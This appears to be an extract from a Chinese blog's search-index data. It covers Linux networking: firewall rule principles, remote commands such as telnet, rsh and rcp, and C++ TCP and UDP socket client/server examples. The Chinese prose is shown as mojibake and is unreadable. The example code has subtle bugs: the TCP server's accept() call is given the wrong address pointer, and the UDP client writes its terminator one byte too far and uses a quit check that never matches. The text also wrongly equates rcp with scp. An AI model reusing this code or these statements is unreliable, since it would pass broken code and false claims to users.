ä¸€åˆ‡æœªè¢«å…è®¸çš„éƒ½æ˜¯ç¦æ­¢çš„ ä¸€åˆ‡æœªè¢«ç¦æ­¢çš„éƒ½æ˜¯å…è®¸çš„ ç”±äºä»¥ä¸Šä¸¤ç§é˜²ç«å¢™åŸåˆ™åœ¨å®‰å…¨æ€§å’Œå¯ä½¿ç”¨æ€§ä¸Šå„æœ‰ä¾§é‡ï¼Œå¾ˆå¤šé˜²ç«å¢™ç³»ç»Ÿå”‰ä¸¤è€…ä¹‹é—´éƒ½é‡‡ç”¨äº†ä¸€å®šçš„æŠ˜ä¸­ã€‚ é˜²ç«å¢™çš„åˆ†ç±» æ ¹æ®ä¸åŒçš„é˜²èŒƒæ–¹å¼å’Œä¾§é‡ç‚¹ï¼Œé˜²ç«å¢™ä¸»è¦åˆ†ä¸ºåˆ†ç»„è¿‡æ»¤å‹å’Œä»£ç†æœåŠ¡å‹ã€‚å®ƒä»¬åœ¨ç½‘ç»œæ€§èƒ½ã€å®‰å…¨æ€§å’Œåº”ç”¨é€æ˜æ€§ç­‰æ–¹é¢å„æœ‰åˆ©å¼Šã€‚ 1ï¼‰åˆ†ç»„è¿‡æ»¤å‹é˜²ç«å¢™ã€‚åˆ†ç»„è¿‡æ»¤å‹é˜²ç«å¢™åªæ˜¯æ ¹æ®æ•°æ®åŒ…çš„å†…å®¹æ¥åˆ¤æ–­æ˜¯å¦å…è®¸æ•°æ®åŒ…çš„ä¼ è¾“ã€‚é€šå¸¸åœ¨ç½‘è·¯å±‚ä¸Šé€šè¿‡å¯¹åˆ†ç»„ä¸­çš„ IP åœ°å€ã€TCP/UDP ç«¯å£å·ä»¥åŠåè®®çŠ¶æ€ç­‰å­—æ®µçš„æ£€æŸ¥æ¥å†³å®šæ˜¯å¦è½¬å‘ä¸€ä¸ªåˆ†ç»„ã€‚ åˆ†ç»„è¿‡æ»¤å‹é˜²ç«å¢™çš„åŸºæœ¬åŸç†ï¼š æ ¹æ®ç½‘ç»œå®‰å…¨ç­–ç•¥ï¼Œåœ¨é˜²ç«å¢™ä¸­äº‹å…ˆè®¾ç½®åˆ†ç»„è¿‡æ»¤è§„åˆ™ æ ¹æ®åˆ†ç»„è¿‡æ»¤è§„åˆ™ï¼Œå¯¹ç»è¿‡é˜²ç«å¢™çš„åˆ†ç»„æµè¿›è¡Œæ£€æŸ¥ åˆ†ç»„è¿‡æ»¤è§„åˆ™ä¸€å®šè¦æŒ‰é¡ºåºæ’åˆ—ã€‚å½“ä¸€ä¸ªåˆ†ç»„åˆ°è¾¾æ—¶ï¼ŒæŒ‰è§„åˆ™çš„æ’åˆ—é¡ºåºä¾æ¬¡è¿ç”¨æ¯ä¸ªè§„åˆ™å¯¹åˆ†ç»„è¿›è¡Œæ£€æŸ¥ã€‚ä¸€æ—¦åˆ†ç»„ä¸ä¸€ä¸ªè§„åˆ™ç›¸åŒ¹é…ï¼Œåˆ™ä¸å†å‘ä¸‹æ£€æŸ¥å…¶ä»–è§„åˆ™ å¦‚æœä¸€ä¸ªåˆ†ç»„ä¸ä¸€ä¸ªæ‹’ç»è½¬å‘çš„è§„åˆ™ç›¸åŒ¹é…ï¼Œåˆ™è¯¥åˆ†ç»„å°†è¢«ç¦æ­¢é€šè¿‡ å¦‚æœä¸€ä¸ªåˆ†ç»„ä¸ä¸€ä¸ªå…è®¸è½¬å‘çš„è§„åˆ™ç›¸åŒ¹é…ï¼Œåˆ™è¯¥åˆ†ç»„å°†è¢«å…è®¸é€šè¿‡ å¦‚æœä¸€ä¸ªåˆ†ç»„ä¸ä¸ä»»ä½•è§„åˆ™ç›¸åŒ¹é…ï¼Œåˆ™è¯¥åˆ†ç»„å°†è¢«ç¦æ­¢é€šè¿‡ï¼Œè¿™æ˜¯éµå¾ª â€œä¸€åˆ‡æœªè¢«å…è®¸çš„éƒ½æ˜¯ç¦æ­¢çš„â€åŸåˆ™ 0x0a Linux å¸¸ç”¨ç½‘ç»œå‘½ä»¤ä»‹ç» è®¡ç®—æœºç½‘ç»œçš„ä¸»è¦ä¼˜ç‚¹æ˜¯èƒ½å¤Ÿå®ç°èµ„æºå’Œä¿¡æ¯çš„å…±äº«ï¼Œå¹¶ä¸”ç”¨æˆ·å¯ä»¥è¿œç¨‹è®¿é—®ä¿¡æ¯ï¼ŒLinux æä¾›äº†ä¸€ç»„å¼ºæœ‰åŠ›çš„ç½‘ç»œå‘½ä»¤æ¥ä¸ºç”¨æˆ·æœåŠ¡ï¼Œè¿™äº›å·¥å…·èƒ½å¤Ÿå¸®åŠ©ç”¨æˆ·ç™»å½•åˆ°è¿œç¨‹è®¡ç®—æœºä¸Šï¼Œä¼ è¾“æ–‡ä»¶å’Œæ‰§è¡Œè¿œç¨‹å‘½ä»¤ç­‰ã€‚ ftp å‘½ä»¤ ftp å‘½ä»¤æ˜¯æ ‡å‡†æ–‡ä»¶ä¼ è¾“åè®®çš„ç”¨æˆ·æ¥å£ã€‚èƒ½å¤Ÿè¿è¡Œç”¨æˆ·ä¼ è¾“ ASCII æ–‡ä»¶å’ŒäºŒè¿›åˆ¶æ–‡ä»¶ã€‚ telnet å‘½ä»¤ ç”¨æˆ·ä½¿ç”¨ telnet å‘½ä»¤è¿›è¡Œè¿œç¨‹ç™»é™†ã€‚è¯¥å‘½ä»¤è¿è¡Œç”¨æˆ·ä½¿ç”¨ telnet åè®®åœ¨è¿œç¨‹è®¡ç®—æœºä¹‹é—´è¿›è¡Œé€šä¿¡ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡ç½‘ç»œåœ¨è¿œç¨‹è®¡ç®—æœºä¸Šç™»å½•ï¼Œå°±åƒç™»å½•åˆ°æœ¬åœ°æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤ä¸€æ ·ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/3.png) rlogin å‘½ä»¤ rlogin æ˜¯ remote login çš„ç¼©å†™ã€‚è¯¥å‘½ä»¤ä¸ telnet å‘½ä»¤ç±»ä¼¼ï¼Œå…è®¸ç”¨æˆ·å¯åŠ¨è¿œç¨‹ç³»ç»Ÿä¸Šçš„äº¤äº’å‘½ä»¤ä¼šè¯ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/4.png) rsh å‘½ä»¤ rsh æ˜¯ remote shell çš„ç¼©å†™ã€‚è¯¥å‘½ä»¤åœ¨æŒ‡å®šçš„è¿œç¨‹ä¸»æœºä¸Šå¯åŠ¨äº†ä¸€ä¸ª shell ï¼Œå¹¶æ‰§è¡Œç”¨æˆ·åœ¨ rsh å‘½ä»¤è¡Œä¸­æŒ‡å®šçš„å‘½ä»¤ã€‚å¦‚æœç”¨æˆ·æ²¡æœ‰ç»™å‡ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œrsh å°±ç”¨ rlogin å‘½ä»¤ä½¿ç”¨æˆ·ç™»å½•åˆ°è¿œç¨‹æœºä¸Šã€‚ ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/5.png) rcp å‘½ä»¤ rcp å…¶å®å°±é€šå¸¸ä½¿ç”¨çš„ scp å‘½ä»¤ï¼Œæ˜¯ remote file copy çš„ç¼©å†™ã€‚è¯¥å‘½ä»¤ç”¨äºåœ¨è®¡ç®—æœºä¹‹é—´å¤åˆ¶æ–‡ä»¶ã€‚ ![å›¾ç‰‡æè¿°](d-Linux ç½‘ç»œåŸºç¡€/6.png) 0x0b Linux ä¸‹ TCP é€šä¿¡å®ä¾‹ æœåŠ¡ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;//å‡ºé”™è°ƒç”¨å‡½æ•°void error_handle(std::string opt, std::string message)&#123; //æ ¹æ®errnoå€¼è·å–å¤±è´¥åŸå› å¹¶æ‰“å°åˆ°ç»ˆç«¯ perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int serv_sock; int client_sock; struct sockaddr_in serv_addr; struct sockaddr_in client_addr; socklen_t client_addr_size; char message[] = &quot;hello world&quot;; //åˆ¤æ–­å‚æ•°æ•°é‡ï¼ŒUsage: &lt;port&gt;ï¼Œ éœ€è¦åœ¨å‘½ä»¤è¡Œè¾“å…¥æœåŠ¡å™¨æ¥æ”¶æ¶ˆæ¯çš„ç«¯å£å· if(argc &lt; 2) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;prot&gt;&quot; &lt;&lt; std::endl; exit(1); &#125; //åˆ›å»ºsocket å¥—æ¥å­— serv_sock = socket(PF_INET, SOCK_STREAM, 0); if(serv_sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //åˆå§‹åŒ–å¥—æ¥å­—ç»“æ„ä½“ memset(&amp;serv_addr, 0, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);//é€‰æ‹©å½“å‰ä»»æ„ç½‘å¡ serv_addr.sin_port = htons(atoi(argv[1]));//è®¾ç½®æ¥æ”¶æ¶ˆæ¯çš„ç«¯å£å· //ç»‘å®šç«¯å£ if(bind(serv_sock, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; error_handle(&quot;bind&quot;, &quot;bind() error.&quot;); &#125; //ç›‘å¬ç«¯å£ï¼Œè®¾ç½®ç­‰å¾…é˜Ÿåˆ—æ•°é‡ä¸º5 if(listen(serv_sock, 5) &lt; 0) &#123; error_handle(&quot;listen&quot;, &quot;listen() error.&quot;); &#125; //æ‰“å°è¾“å‡ºç­‰å¾…è¿æ¥ std::cout &lt;&lt; &quot;Waiting Client....&quot; &lt;&lt; std::endl; client_addr_size = sizeof(client_addr); //ç­‰å¾…æ¥æ”¶å®¢æˆ·ç«¯å»ºç«‹è¿æ¥ client_sock = accept(serv_sock, (struct sockaddr*)&amp;client_sock, &amp;client_addr_size); if(client_sock &lt; 0) &#123; error_handle(&quot;accept&quot;, &quot;accept() error.&quot;); &#125; //accept() æˆåŠŸå»ºç«‹è¿æ¥åï¼ŒæœåŠ¡å™¨å°±ä¼šå¾—åˆ°å®¢æˆ·ç«¯çš„ IP åœ°å€å’Œç«¯å£å·ã€‚ //æ‰“å°å®¢æˆ·ç«¯ IP å’Œç«¯å£å· std::cout &lt;&lt; &quot;Client IP : &quot; &lt;&lt; inet_ntoa(client_addr.sin_addr) &lt;&lt; &quot; , port : &quot; &lt;&lt; ntohs(client_addr.sin_port) &lt;&lt; std::endl; //å‘å®¢æˆ·ç«¯å‘é€ &quot;hello world&quot; æ¶ˆæ¯ï¼Œä½¿ç”¨write æ ‡å‡†IOæ¥å£å°±å¯ä»¥ write(client_sock, message, sizeof(message)); //å…³é—­TCPè¿æ¥ close(client_sock); //å…³é—­socketå¥—æ¥å­— close(serv_sock); return 0;&#125; å®¢æˆ·ç«¯ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;//å‡ºé”™è°ƒç”¨å‡½æ•°void error_handle(std::string opt, std::string message)&#123; //æ ¹æ®errnoå€¼è·å–å¤±è´¥åŸå› å¹¶æ‰“å°åˆ°ç»ˆç«¯ perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int sock;//socketå¥—æ¥å­— struct sockaddr_in serv_addr;//æœåŠ¡å™¨å¥—æ¥å­—ç»“æ„ä½“ char message[64];//ç”¨äºæ¥æ”¶æœåŠ¡å™¨æ¶ˆæ¯çš„ç¼“å†²åŒº int str_len; //åˆ¤æ–­å½“å‰å‚æ•°æ•°é‡ï¼Œéœ€è¦å‘½ä»¤è¡Œå‚æ•° &lt;IP&gt; &lt;port&gt; if(argc &lt; 3) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;IP&gt; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(1); &#125; //åˆ›å»ºsocket å¥—æ¥å­— sock = socket(PF_INET, SOCK_STREAM, 0); if(sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //åˆå§‹åŒ–æœåŠ¡å™¨å¥—æ¥å­—ç»“æ„ä½“å‚æ•°ï¼Œè®¾ç½®å¯¹æ–¹çš„IPåœ°å€å’Œç«¯å£å· memset(&amp;serv_addr, 0, sizeof(serv_addr)); serv_addr.sin_family = AF_INET; serv_addr.sin_addr.s_addr = inet_addr(argv[1]); serv_addr.sin_port = htons(atoi(argv[2])); //ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ if(connect(sock, (struct sockaddr*)&amp;serv_addr, sizeof(serv_addr)) &lt; 0) &#123; error_handle(&quot;connect&quot;, &quot;connect() error.&quot;); &#125; //è¯»å–æœåŠ¡å™¨å‘é€æ¥çš„æ¶ˆæ¯ str_len = read(sock, message, sizeof(message) -1); if(str_len &lt; 0) &#123; //read() è¯»å–æ•°æ®å¤±è´¥ error_handle(&quot;read&quot;, &quot;read() error.&quot;); &#125; //å°†è¯»å–åˆ°çš„è¾“å‡ºæ‰“å°å‡ºæ¥ std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; //å…³é—­socket å¥—æ¥å­— close(sock); return 0;&#125; 0x0c Linux ä¸‹ UDP é€šä¿¡å®ä¾‹ æœåŠ¡ç«¯ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#define BUF_SIZE 128//å‡ºé”™è°ƒç”¨å‡½æ•°void error_handle(std::string opt, std::string message)&#123; //æ ¹æ®errnoå€¼è·å–å¤±è´¥åŸå› å¹¶æ‰“å°åˆ°ç»ˆç«¯ perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int serv_sock; char message[BUF_SIZE]; int str_len; socklen_t client_adr_sz; struct sockaddr_in serv_adr, client_adr; //å› ä¸ºæœåŠ¡å™¨ç¨‹åºä½¿ç”¨æ—¶é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šæ¥æ”¶æ¶ˆæ¯çš„ç«¯å£å·ï¼Œ //æ‰€ä»¥å½“å‚æ•°æ•°é‡å°‘äºéœ€æ±‚ 2 æ—¶ï¼Œç¨‹åºç»“æŸå¹¶æŠ¥é”™ if(argc != 2)&#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(0); &#125; //åˆ›å»ºsocket å¥—æ¥å­—ï¼Œsock ç”¨äºåé¢å‘é€å’Œæ¥æ”¶æ•°æ® serv_sock = socket(PF_INET, SOCK_DGRAM, 0); if(serv_sock == -1) &#123; error_handle(&quot;socket&quot;, &quot;UDP socket creation error.&quot;); &#125; //åˆå§‹åŒ–å¥—æ¥å­—ç»“æ„ä½“ï¼Œåˆå§‹åŒ–æœåŠ¡å™¨å¥—æ¥å­—ç»“æ„ä½“ä¸­çš„ IP åœ°å€å’Œç«¯å£å· memset(&amp;serv_adr, 0, sizeof(serv_adr)); serv_adr.sin_family = AF_INET; serv_adr.sin_addr.s_addr = htonl(INADDR_ANY); serv_adr.sin_port = htons(atoi(argv[1])); //å°†socketå¥—æ¥å­—ç»‘å®šå›ºå®šç«¯å£è¿›è¡Œæ¶ˆæ¯æ¥æ”¶ if(bind(serv_sock, (struct sockaddr*)&amp;serv_adr, sizeof(serv_adr)) == -1) &#123; error_handle(&quot;bind&quot;, &quot;bind() error.&quot;); &#125; //UDP æ–¹å¼ä¸éœ€è¦è¿›è¡Œ listen å’Œ accept æ“ä½œï¼Œç›´æ¥å°±å¯ä»¥é€šè¿‡ recvfrom å‡½æ•°å»æ¥æ”¶å¥—æ¥å­—ä¸­æ”¶åˆ°çš„æ•°æ®ã€‚ while(1) &#123; //æ¸…ç©ºæ¥æ”¶æ¶ˆæ¯æ•°æ®çš„ç¼“å­˜åŒº memset(message, 0, BUF_SIZE); //è®¡ç®—å®¢æˆ·ç«¯ç»“æ„ä½“å¤§å°ï¼Œç”¨äºæ¥æ”¶å®¢æˆ·ç«¯æ•°æ®ç»“æ„ client_adr_sz = sizeof(client_adr); //recvfrom() è°ƒç”¨ä¸ä»…æ”¶åˆ°å¯¹æ–¹å‘é€æ¥çš„æ•°æ®ï¼Œè¿˜é€šè¿‡æœ€åä¸¤ä¸ªå‚æ•°è¿”å›äº†å¯¹æ–¹çš„ IP åœ°å€å’Œç«¯å£å·ä¿¡æ¯ï¼Œç”¨äºè¿”å›æ•°æ®ä½¿ç”¨ã€‚ str_len = recvfrom(serv_sock, message, BUF_SIZE, 0, (struct sockaddr*)&amp;client_adr, &amp;client_adr_sz); //å°†æ”¶åˆ°çš„ä¿¡æ¯æ‰“å°å‡ºæ¥ std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; //é€šè¿‡recvfrom è¿”å›çš„å‘é€æ–¹çš„IPåœ°å€å’Œç«¯å£å·ä¿¡æ¯ï¼Œä½¿ç”¨ sendto å°†æ”¶åˆ°çš„ä¿¡æ¯å†æ¬¡å‘é€å›å»ã€‚ sendto(serv_sock, message, str_len, 0, (struct sockaddr*)&amp;client_adr, client_adr_sz); &#125; //ç»“æŸç¨‹åºåå…³é—­socketå¥—æ¥å­— close(serv_sock); return 0;&#125; å®¢æˆ·ç«¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;sys/socket.h&gt;#define BUF_SIZE 128//å‡ºé”™è°ƒç”¨å‡½æ•°void error_handle(std::string opt, std::string message)&#123; //æ ¹æ®errnoå€¼è·å–å¤±è´¥åŸå› å¹¶æ‰“å°åˆ°ç»ˆç«¯ perror(opt.c_str()); std::cout &lt;&lt; message &lt;&lt; std::endl; exit(1);&#125;int main(int argc, char *argv[])&#123; int sock; char message[BUF_SIZE]; int str_len; socklen_t adr_sz; struct sockaddr_in serv_adr, from_adr; //å› ä¸ºå®¢æˆ·ç«¯ç¨‹åºä½¿ç”¨æ—¶é€šè¿‡å‘½ä»¤è¡Œå‚æ•°æŒ‡å®šIPåœ°å€å’Œç«¯å£å·ï¼Œ //æ‰€ä»¥å½“å‚æ•°æ•°é‡å°‘äºéœ€æ±‚ 3 æ—¶ï¼Œç¨‹åºç»“æŸå¹¶æŠ¥é”™ if(argc &lt; 3) &#123; std::cout &lt;&lt; &quot;Usage : &quot; &lt;&lt; argv[0] &lt;&lt; &quot; &lt;IP&gt; &lt;port&gt;&quot; &lt;&lt; std::endl; exit(0); &#125; //åˆ›å»ºsocket å¥—æ¥å­—ï¼Œsock ç”¨äºåé¢å‘é€å’Œæ¥æ”¶æ•°æ® sock = socket(PF_INET, SOCK_DGRAM, 0); if(sock &lt; 0) &#123; error_handle(&quot;socket&quot;, &quot;socket() error.&quot;); &#125; //åˆå§‹åŒ–å¥—æ¥å­—ç»“æ„ä½“ï¼Œåˆå§‹åŒ–æœåŠ¡å™¨å¥—æ¥å­—ç»“æ„ä½“ä¸­çš„ IP åœ°å€å’Œç«¯å£å· memset(&amp;serv_adr, 0, sizeof(serv_adr)); serv_adr.sin_family = AF_INET; serv_adr.sin_addr.s_addr = inet_addr(argv[1]); serv_adr.sin_port = htons(atoi(argv[2])); while(1) &#123; //ä»æ ‡å‡†è¾“å…¥è·å–å‘é€æ•°æ®ï¼Œä¿å­˜åˆ°messageç¼“å­˜åŒº std::cin &gt;&gt; message; //åˆ¤æ–­å¦‚æœè¾“å…¥æ˜¯ &#x27;q&#x27; æˆ–è€… &#x27;Q&#x27; åˆ™è¡¨ç¤ºé€€å‡ºå®¢æˆ·ç«¯ç¨‹åº if(!strcmp(message, &quot;q\\n&quot;) || !strcmp(message, &quot;Q\\n&quot;)) &#123; //é€€å‡º break; &#125; //å‘é€æ¶ˆæ¯ sendto(sock, message, strlen(message), 0, (struct sockaddr*)&amp;serv_adr, sizeof(serv_adr)); //æ¸…ç©ºæ¥æ”¶æ•°ç»„ memset(message, 0, BUF_SIZE); //è®¡ç®—è¿”å›å¥—æ¥å­—ç»“æ„ä½“å­—èŠ‚é•¿åº¦ adr_sz = sizeof(from_adr); //æ¥æ”¶UDPè¿”å›æ•°æ® str_len = recvfrom(sock, message, BUF_SIZE, 0, (struct sockaddr*)&amp;from_adr, &amp;adr_sz); //åœ¨æ¥æ”¶æ•°æ®å°¾éƒ¨æ·»åŠ &#x27;0&#x27;ç»“æŸç¬¦ message[str_len + 1] = 0; //å°†æ¥æ”¶æ•°æ®æ‰“å°è¾“å‡º std::cout &lt;&lt; &quot;Recv Message : &quot; &lt;&lt; message &lt;&lt; std::endl; &#125;&#125;","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"å†…æ ¸","slug":"å†…æ ¸","permalink":"https://hodlyounger.github.io/tags/%E5%86%85%E6%A0%B8/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","slug":"A-OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90/"}]},{"title":"ã€åŸç†å‰–æã€‘4-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹æ¶ˆæ¯é˜Ÿåˆ—","date":"2023-12-25T16:00:00.000Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘4-è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ä¹‹æ¶ˆæ¯é˜Ÿåˆ—/","text":"æ¦‚è¿°ï¼šçŸ¥è¯†ç‚¹ Linux æ¶ˆæ¯é˜Ÿåˆ—æ–¹å¼åŸç†ä»‹ç» Linux æ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³ API ä»‹ç» 0x01 Linux æ¶ˆæ¯é˜Ÿåˆ— æ¶ˆæ¯é˜Ÿåˆ— (ä¹Ÿå«åšæŠ¥æ–‡é˜Ÿåˆ—)æ˜¯ Unix ç³»ç»Ÿ V ç‰ˆæœ¬ä¸­ 3 ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ä¹‹ä¸€ã€‚å¦å¤–ä¸¤ç§æ˜¯ä¿¡å·é‡å’Œå…±äº«å†…å­˜ã€‚è¿™äº› IPC æœºåˆ¶ä½¿ç”¨å…±åŒçš„æˆæƒæ–¹æ³•ã€‚åªæœ‰é€šè¿‡ç³»ç»Ÿè°ƒç”¨å°†æ ‡å¿—ç¬¦ä¼ é€’ç»™æ ¸å¿ƒä¹‹åï¼Œè¿›ç¨‹æ‰èƒ½å­˜å–è¿™äº›èµ„æºã€‚è¿™ç§ç³»ç»Ÿ IPC å¯¹è±¡ä½¿ç”¨çš„æ§åˆ¶æ–¹æ³•å’Œæ–‡ä»¶ç³»ç»Ÿéå¸¸ç±»ä¼¼ã€‚ä½¿ç”¨å¯¹è±¡çš„å¼•ç”¨æ ‡å¿—ç¬¦ä½œä¸ºèµ„æºè¡¨ä¸­çš„ç´¢å¼•ã€‚ æ¶ˆæ¯é˜Ÿåˆ—å°±æ˜¯ä¸€ä¸ªæ¶ˆæ¯çš„é“¾è¡¨ã€‚å°±æ˜¯æŠŠæ¶ˆæ¯çœ‹ä½œä¸€ä¸ªè®°å½•ï¼Œå¹¶ä¸”è¿™ä¸ªè®°å½•å…·æœ‰ç‰¹å®šçš„æ ¼å¼ä»¥åŠç‰¹å®šçš„ä¼˜å…ˆçº§ã€‚å¯¹æ¶ˆæ¯é˜Ÿåˆ—æœ‰å†™æƒé™çš„è¿›ç¨‹å¯ä»¥æŒ‰ç…§ä¸€å®šçš„è§„åˆ™æ·»åŠ æ–°æ¶ˆæ¯ï¼›å¯¹æ¶ˆæ¯é˜Ÿåˆ—æœ‰è¯»æƒé™çš„è¿›ç¨‹åˆ™å¯ä»¥ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å‡ºæ¶ˆæ¯ã€‚ Linux é‡‡ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æ–¹å¼æ¥å®ç°æ¶ˆæ¯ä¼ é€’ã€‚è¿™ç§æ¶ˆæ¯çš„å‘é€æ–¹å¼æ˜¯ï¼šå‘é€æ–¹ä¸å¿…ç­‰å¾…æ¥æ”¶æ–¹æ£€æŸ¥å®ƒæ‰€æ”¶åˆ°çš„æ¶ˆæ¯å°±å¯ä»¥ç»§ç»­å·¥ä½œä¸‹å»ï¼Œè€Œæ¥æ”¶æ–¹å¦‚æœæ²¡æœ‰æ”¶åˆ°æ¶ˆæ¯ä¹Ÿä¸éœ€ç­‰å¾…ã€‚è¿™ç§é€šä¿¡æœºåˆ¶ç›¸å¯¹ç®€å•ï¼Œä½†æ˜¯åº”ç”¨ç¨‹åºä½¿ç”¨èµ·æ¥å°±éœ€è¦ä½¿ç”¨ç›¸å¯¹å¤æ‚çš„æ–¹å¼æ¥åº”ä»˜äº†ã€‚æ–°çš„æ¶ˆæ¯æ€»æ˜¯æ”¾åœ¨é˜Ÿåˆ—çš„æœ«å°¾ï¼Œæ¥æ”¶çš„æ—¶å€™å¹¶ä¸æ€»æ˜¯ä»å¤´æ¥æ¥æ”¶ï¼Œå¯ä»¥ä»ä¸­é—´æ¥æ¥æ”¶ã€‚ æ¶ˆæ¯é˜Ÿåˆ—æ˜¯éšå†…æ ¸æŒç»­çš„å¹¶å’Œè¿›ç¨‹ç›¸å…³ï¼Œåªæœ‰åœ¨å†…æ ¸é‡èµ·æˆ–è€…æ˜¾ç¤ºåˆ é™¤ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œè¯¥æ¶ˆæ¯é˜Ÿåˆ—æ‰ä¼šçœŸæ­£è¢«åˆ é™¤ã€‚å› æ­¤ç³»ç»Ÿä¸­è®°å½•æ¶ˆæ¯é˜Ÿåˆ—çš„æ•°æ®ç»“æ„ (struct ipc_ids msg_ids)ä½äºå†…æ ¸ä¸­ï¼Œç³»ç»Ÿä¸­çš„æ‰€æœ‰æ¶ˆæ¯é˜Ÿåˆ—éƒ½å¯ä»¥åœ¨ç»“æ„ msg_ids ä¸­ä¸­æ‰¾åˆ°è®¿é—®å…¥å£ã€‚ IPC æ ‡è¯†ç¬¦ï¼šæ¯ä¸€ä¸ª IPC ç›®æ ‡éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„ IPCæ ‡è¯†ç¬¦ ã€‚è¿™é‡Œæ‰€æŒ‡çš„ IPCç›®æ ‡ æ˜¯æŒ‡ä¸€ä¸ªå•ç‹¬çš„æ¶ˆæ¯é˜Ÿåˆ—ã€ä¸€ä¸ªä¿¡å·é‡é›†æˆ–è€…ä¸€ä¸ªå…±äº«çš„å†…å­˜æ®µã€‚ç³»ç»Ÿå†…æ ¸ä½¿ç”¨æ­¤æ ‡è¯†ç¬¦åœ¨ç³»ç»Ÿå†…æ ¸ä¸­æŒ‡æ˜ IPCç›®æ ‡ ã€‚ IPCå…³é”®å­— ï¼šæƒ³è¦è·å¾—å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œåˆ™å¿…é¡»ä½¿ç”¨ä¸€ä¸ª IPCå…³é”®å­— ã€‚å®¢æˆ·ç«¯è¿›ç¨‹å’ŒæœåŠ¡å™¨ç«¯è¿›ç¨‹å¿…é¡»åŒæ–¹éƒ½åŒæ„æ­¤å…³é”®å­—ã€‚è¿™æ˜¯å»ºç«‹ä¸€ä¸ªå®¢æˆ·æœº/æœåŠ¡å™¨æ¡†æ¶çš„ç¬¬ä¸€æ­¥ã€‚åœ¨ System V IPC æœºåˆ¶ä¸­ï¼Œå»ºç«‹ä¸¤ç«¯è”ç³»çš„è·¯ç”±æ–¹æ³•æ˜¯å’Œ IPCå…³é”®å­— ç›´æ¥ç›¸å…³çš„ã€‚é€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­è®¾ç½®å…³é”®å­—å€¼ï¼Œæ¯ä¸€æ¬¡ä½¿ç”¨çš„å…³é”®å­—éƒ½å¯ä»¥æ˜¯ç›¸åŒçš„ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨ ftok() 